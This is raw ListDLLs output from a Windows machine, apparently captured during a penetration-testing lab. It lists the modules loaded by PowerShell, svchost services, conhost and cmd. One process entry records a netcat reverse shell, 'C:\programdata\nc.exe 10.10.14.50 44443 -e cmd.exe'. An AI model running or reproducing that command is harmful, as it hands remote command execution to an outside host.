Error opening System(4):
0x0000000014eb0000  0xf7000   C:\Windows\SYSTEM32\MSVCR120_CLR0400.dll
0x0000000011550000  0x15eb000  C:\Windows\assembly\NativeImages_v4.0.30319_64\mscorlib\409600fc768e8c63f3c1e32b29a705d7\mscorlib.ni.dll
0x0000000010900000  0xc45000  C:\Windows\assembly\NativeImages_v4.0.30319_64\System\4b66bb4b2018c264c2eb0ec1acf1022b\System.ni.dll
0x000000000feb0000  0xa50000  C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Core\04de694a9bd8fae53cdf29353b6f76d4\System.Core.ni.dll
0x00000000ff850000  0xa4000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pb378ec07#\72a4ba844e2d0493b63101c3f0fc83b5\Microsoft.PowerShell.ConsoleHost.ni.dll
0x0000000026a90000  0x1b000   C:\Windows\System32\CRYPTSP.dll
0x0000000025580000  0x33000   C:\Windows\system32\rsaenh.dll
0x0000000025bd0000  0xc000    C:\Windows\SYSTEM32\CRYPTBASE.dll
0x00000000fd880000  0x1fcf000  C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\f34541d6d8538145c6792a51e968dda0\System.Management.Automation.ni.dll
0x00000000289e0000  0xa8000   C:\Windows\System32\clbcatq.dll
0x000000002a220000  0x8000    C:\Windows\System32\psapi.dll
0x00000000148c0000  0x17000   C:\Windows\SYSTEM32\amsi.dll
0x0000000026110000  0x29000   C:\Windows\SYSTEM32\USERENV.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000028bf0000  0x14f8000  C:\Windows\System32\shell32.dll
0x0000000026e70000  0x4a000   C:\Windows\System32\cfgmgr32.dll
0x0000000027550000  0xa7000   C:\Windows\System32\shcore.dll
0x00000000262e0000  0x747000  C:\Windows\System32\windows.storage.dll
0x0000000026210000  0x5d000   C:\Windows\System32\powrprof.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\wintrust.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\wldp.dll
0x0000000024e60000  0x22000   C:\Windows\SYSTEM32\gpapi.dll
0x00000000fd5c0000  0x9b000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Mf49f6405#\043cbebf7bb05aa9452d74d429ead1f5\Microsoft.Management.Infrastructure.ni.dll
0x0000000005e80000  0x15e000  C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Management\89a9328433252894b4edb17960e4d8cd\System.Management.ni.dll
0x0000000009170000  0x15f000  C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Dired13b18a9#\f572a71fcc094b9cd563a26f3f2c200f\System.DirectoryServices.ni.dll
0x000000000e650000  0x88c000  C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Xml\f8ba7a3ded252b9c98d8a2e49be2872b\System.Xml.ni.dll
0x0000000009ab0000  0x4f000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Numerics\bfd9ae53173c00a6f6bcf478e7eb5d51\System.Numerics.ni.dll
0x000000000dd00000  0x948000  C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Data\0442e5fe3fc8e6d418122e7c987073f8\System.Data.ni.dll
0x000000000d990000  0x369000  C:\Windows\Microsoft.Net\assembly\GAC_64\System.Data\v4.0_4.0.0.0__b77a5c561934e089\System.Data.dll
0x00000000282b0000  0x6d000   C:\Windows\System32\WS2_32.dll
0x0000000028960000  0x75000   C:\Windows\System32\coml2.dll
0x0000000014980000  0x12b000  C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Configuration\139bfe3e83a05a028697e383028ed134\System.Configuration.ni.dll
0x0000000014280000  0x12b000  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
0x00000000fd560000  0x5f000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P6f792626#\5cde48e23654e9b99aed275971e1c4ac\Microsoft.PowerShell.Security.ni.dll
0x0000000006e10000  0xd6000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Transactions\f5f0c784e2cd4b0d6a618f318ca4fe5b\System.Transactions.ni.dll
0x00000000fd510000  0x4f000   C:\Windows\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll
0x000000001caa0000  0xc000    C:\Windows\SYSTEM32\secur32.dll
0x0000000026140000  0x2f000   C:\Windows\SYSTEM32\SSPICLI.DLL
0x00000000fc830000  0xcdf000  C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P521220ea#\42e059dde10b787468878e6ba5bdff7b\Microsoft.PowerShell.Commands.Utility.ni.dll
0x00000000148e0000  0x2c000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Confe64a9051#\f651def756bd6e91c859cb06f47d4516\System.Configuration.Install.ni.dll
0x0000000025a00000  0x67000   C:\Windows\system32\mswsock.dll
0x00000000fc600000  0x22f000  C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pae3498d9#\f6f87b28a0938f6f18d27a68219565b6\Microsoft.PowerShell.Commands.Management.ni.dll
0x000000001b580000  0x1d7000  C:\Windows\SYSTEM32\urlmon.dll
0x000000001bcf0000  0x2ab000  C:\Windows\SYSTEM32\iertutil.dll
0x000000001b940000  0x26000   C:\Windows\SYSTEM32\srvcli.dll
0x0000000025870000  0xe000    C:\Windows\SYSTEM32\netutils.dll
0x0000000009dd0000  0xa5000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.M870d558a#\a7bf45cf063c41f9c0d1a77ec6aa47a0\Microsoft.Management.Infrastructure.Native.ni.dll
0x00000000228b0000  0x1a9000  C:\Windows\SYSTEM32\PROPSYS.dll
0x0000000014d50000  0x13000   C:\Windows\SYSTEM32\virtdisk.dll
0x0000000014d40000  0xa000    C:\Windows\SYSTEM32\FLTLIB.DLL
0x0000000009d10000  0xb9000   C:\Windows\Microsoft.Net\assembly\GAC_64\Microsoft.AppV.AppvClientComConsumer\v4.0_10.0.0.0__31bf3856ad364e35\Microsoft.AppV.AppvClientComConsumer.dll
0x0000000027fd0000  0x8000    C:\Windows\System32\Normaliz.dll
0x00000000fc110000  0x4e2000  C:\Windows\SYSTEM32\WININET.dll
0x0000000013d00000  0x2f000   C:\Windows\SYSTEM32\cryptnet.dll
0x0000000025710000  0x3d000   C:\Windows\SYSTEM32\IPHLPAPI.DLL
0x0000000020ea0000  0xb000    C:\Windows\SYSTEM32\WINNSI.DLL
0x00000000274e0000  0x8000    C:\Windows\System32\NSI.dll
0x0000000020eb0000  0xfd000   C:\Windows\SYSTEM32\WINHTTP.dll
0x0000000020580000  0x16000   C:\Windows\SYSTEM32\dhcpcsvc6.DLL
0x0000000020550000  0x1c000   C:\Windows\SYSTEM32\dhcpcsvc.DLL
0x000000001f810000  0x99000   C:\Windows\SYSTEM32\webio.dll
0x0000000025750000  0xc6000   C:\Windows\SYSTEM32\DNSAPI.dll
0x000000001fff0000  0xa000    C:\Windows\System32\rasadhlp.dll
0x0000000009ef0000  0x63000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Ibaae5ed9#\e655fc7776fefa5c70670b22c0025927\Microsoft.IIS.Powershell.Commands.ni.dll
0x000000000bf20000  0x23000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Kd58820a5#\493ef6cb15fa7d85ba86bd96359670b3\Microsoft.KeyDistributionService.Cmdlets.ni.dll
0x0000000009ed0000  0x13000   C:\Windows\Microsoft.Net\assembly\GAC_64\Microsoft.KeyDistributionService.Cmdlets\v4.0_10.0.0.0__31bf3856ad364e35\Microsoft.KeyDistributionService.Cmdlets.dll
0x0000000027f70000  0x60000   C:\Windows\System32\WLDAP32.dll
0x0000000009cf0000  0x1a000   C:\Windows\SYSTEM32\KdsCli.dll
0x0000000025c90000  0x3c000   C:\Windows\SYSTEM32\NTASN1.dll
0x0000000009b70000  0x37000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.IO.Cb3b124c8#\a032155c8d39a7efb8fd0d608a727e4a\System.IO.Compression.ni.dll
0x0000000013cf0000  0xe000    C:\Windows\assembly\NativeImages_v4.0.30319_64\System.IO.Cf61e09c5#\646e80d9816124dea1d55e9cfefb8a89\System.IO.Compression.FileSystem.ni.dll
0x0000000024440000  0x8c000   C:\Windows\system32\apphelp.dll
------------------------------------------------------------------------------
svchost.exe pid: 1128
Command line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s DsSvc

Base                Size      Path
0x0000000073cb0000  0x10000   C:\Windows\System32\svchost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x0000000009300000  0x2d000   c:\windows\system32\dssvc.dll
0x00000000153d0000  0x32b000  c:\windows\system32\ESENT.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
0x00000000262e0000  0x747000  C:\Windows\System32\windows.storage.dll
0x0000000027550000  0xa7000   C:\Windows\System32\shcore.dll
0x0000000028740000  0xa8000   C:\Windows\System32\advapi32.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000026210000  0x5d000   C:\Windows\System32\powrprof.dll
0x0000000027480000  0x52000   C:\Windows\System32\shlwapi.dll
0x0000000025bd0000  0xc000    C:\Windows\System32\CRYPTBASE.DLL
0x00000000289e0000  0xa8000   C:\Windows\System32\clbcatq.dll
------------------------------------------------------------------------------
svchost.exe pid: 3600
Command line: C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon

Base                Size      Path
0x0000000073cb0000  0x10000   C:\Windows\system32\svchost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x0000000009ce0000  0xd000    c:\windows\system32\seclogon.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
0x0000000026140000  0x2f000   c:\windows\system32\SspiCli.dll
0x0000000025bd0000  0xc000    c:\windows\system32\CRYPTBASE.dll
0x0000000026110000  0x29000   c:\windows\system32\USERENV.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000024440000  0x8c000   C:\Windows\system32\apphelp.dll
------------------------------------------------------------------------------
nc.exe pid: 4964
Command line: C:\programdata\nc.exe 10.10.14.50 44443 -e cmd.exe

Base                Size      Path
0x0000000000400000  0x13000   C:\programdata\nc.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x00000000274f0000  0x53000   C:\Windows\System32\wow64.dll
0x0000000027600000  0x7c000   C:\Windows\System32\wow64win.dll
0x0000000077890000  0x9000    C:\Windows\System32\wow64cpu.dll
0x0000000000400000  0x13000   C:\programdata\nc.exe
0x00000000778a0000  0x19d000  C:\Windows\SysWOW64\ntdll.dll
0x00000000768b0000  0xe0000   C:\Windows\SysWOW64\KERNEL32.DLL
0x0000000077150000  0x202000  C:\Windows\SysWOW64\KERNELBASE.dll
0x0000000074e00000  0x9c000   C:\Windows\SysWOW64\apphelp.dll
0x0000000074df0000  0x8000    C:\Windows\SysWOW64\WSOCK32.dll
0x00000000767e0000  0xc0000   C:\Windows\SysWOW64\msvcrt.dll
0x0000000077580000  0x5f000   C:\Windows\SysWOW64\ws2_32.DLL
0x0000000077400000  0xbd000   C:\Windows\SysWOW64\RPCRT4.dll
0x0000000074eb0000  0x20000   C:\Windows\SysWOW64\SspiCli.dll
0x0000000074ea0000  0xa000    C:\Windows\SysWOW64\CRYPTBASE.dll
0x0000000077510000  0x65000   C:\Windows\SysWOW64\bcryptPrimitives.dll
0x0000000076370000  0x7a000   C:\Windows\SysWOW64\sechost.dll
0x0000000076f80000  0x19000   C:\Windows\SysWOW64\bcrypt.dll
0x0000000074dd0000  0x11000   C:\Windows\SysWOW64\napinsp.dll
0x0000000074d70000  0x52000   C:\Windows\SysWOW64\mswsock.dll
0x0000000074cd0000  0x91000   C:\Windows\SysWOW64\DNSAPI.dll
0x0000000077110000  0x7000    C:\Windows\SysWOW64\NSI.dll
0x0000000074c90000  0x33000   C:\Windows\SysWOW64\IPHLPAPI.DLL
0x0000000074c80000  0xb000    C:\Windows\SysWOW64\winrnr.dll
0x0000000074c60000  0x16000   C:\Windows\SysWOW64\NLAapi.dll
0x0000000074c50000  0x10000   C:\Windows\SysWOW64\wshbth.dll
0x0000000074c40000  0x8000    C:\Windows\SysWOW64\rasadhlp.dll
------------------------------------------------------------------------------
conhost.exe pid: 712
Command line: \??\C:\Windows\system32\conhost.exe 0x4

Base                Size      Path
0x000000002ba20000  0xd1000   C:\Windows\system32\conhost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000027550000  0xa7000   C:\Windows\System32\shcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000028740000  0xa8000   C:\Windows\System32\advapi32.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000028bf0000  0x14f8000  C:\Windows\System32\shell32.dll
0x0000000026e70000  0x4a000   C:\Windows\System32\cfgmgr32.dll
0x00000000262e0000  0x747000  C:\Windows\System32\windows.storage.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000026210000  0x5d000   C:\Windows\System32\powrprof.dll
0x0000000027480000  0x52000   C:\Windows\System32\shlwapi.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000026a90000  0x1b000   C:\Windows\System32\cryptsp.dll
------------------------------------------------------------------------------
cmd.exe pid: 4592
Command line: cmd.exe

Base                Size      Path
0x0000000000340000  0x59000   C:\Windows\SysWOW64\cmd.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x00000000274f0000  0x53000   C:\Windows\System32\wow64.dll
0x0000000027600000  0x7c000   C:\Windows\System32\wow64win.dll
0x0000000077890000  0x9000    C:\Windows\System32\wow64cpu.dll
0x0000000000340000  0x59000   C:\Windows\SysWOW64\cmd.exe
0x00000000778a0000  0x19d000  C:\Windows\SysWOW64\ntdll.dll
0x00000000768b0000  0xe0000   C:\Windows\SysWOW64\KERNEL32.DLL
0x0000000077150000  0x202000  C:\Windows\SysWOW64\KERNELBASE.dll
0x00000000767e0000  0xc0000   C:\Windows\SysWOW64\msvcrt.dll
0x0000000076d00000  0x272000  C:\Windows\SysWOW64\combase.dll
0x0000000076990000  0x123000  C:\Windows\SysWOW64\ucrtbase.dll
0x0000000077400000  0xbd000   C:\Windows\SysWOW64\RPCRT4.dll
0x0000000074eb0000  0x20000   C:\Windows\SysWOW64\SspiCli.dll
0x0000000074ea0000  0xa000    C:\Windows\SysWOW64\CRYPTBASE.dll
0x0000000077510000  0x65000   C:\Windows\SysWOW64\bcryptPrimitives.dll
0x0000000076370000  0x7a000   C:\Windows\SysWOW64\sechost.dll
0x0000000076f80000  0x19000   C:\Windows\SysWOW64\bcrypt.dll
0x0000000074c10000  0x27000   C:\Windows\SysWOW64\winbrand.dll
0x0000000074e00000  0x9c000   C:\Windows\SysWOW64\apphelp.dll
0x0000000074c00000  0xa000    C:\Windows\SysWOW64\cmdext.dll
------------------------------------------------------------------------------
svchost.exe pid: 5028
Command line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost

Base                Size      Path
0x0000000073cb0000  0x10000   C:\Windows\System32\svchost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x0000000014520000  0x1e000   c:\windows\system32\wdi.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
0x0000000018f20000  0x14000   C:\Windows\system32\pcadm.dll
0x0000000028740000  0xa8000   C:\Windows\System32\ADVAPI32.dll
0x00000000202e0000  0x13000   C:\Windows\System32\WTSAPI32.dll
0x0000000018600000  0x15000   C:\Windows\System32\pcacli.dll
0x000000001c270000  0x1b000   C:\Windows\System32\MPR.dll
------------------------------------------------------------------------------
svchost.exe pid: 4204
Command line: C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc

Base                Size      Path
0x0000000073cb0000  0x10000   C:\Windows\system32\svchost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x00000000184b0000  0x8b000   c:\windows\system32\pcasvc.dll
0x0000000026210000  0x5d000   C:\Windows\System32\powrprof.dll
0x0000000026e70000  0x4a000   C:\Windows\System32\cfgmgr32.dll
0x0000000028740000  0xa8000   C:\Windows\System32\advapi32.dll
0x0000000026a90000  0x1b000   C:\Windows\System32\cryptsp.dll
0x0000000024440000  0x8c000   c:\windows\system32\apphelp.dll
0x0000000026110000  0x29000   c:\windows\system32\USERENV.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
------------------------------------------------------------------------------
Listdlls64.exe pid: 4416
